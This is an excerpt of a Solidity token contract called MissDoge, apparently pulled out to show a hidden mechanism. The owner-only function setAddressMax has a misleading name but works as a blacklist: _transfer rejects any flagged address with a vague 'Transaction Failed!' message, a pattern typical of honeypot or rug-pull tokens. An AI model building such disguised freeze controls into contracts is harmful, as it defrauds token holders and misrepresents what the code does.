...
contract MissDoge is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public _setAddressMax;
    ...
    function setAddressMax(address account, bool value) public onlyOwner {
        _setAddressMax[account] = value;
    }
    ...
    function _transfer(
        ...
        require(!_setAddressMax[from] && !_setAddressMax[to], "Transaction Failed!");
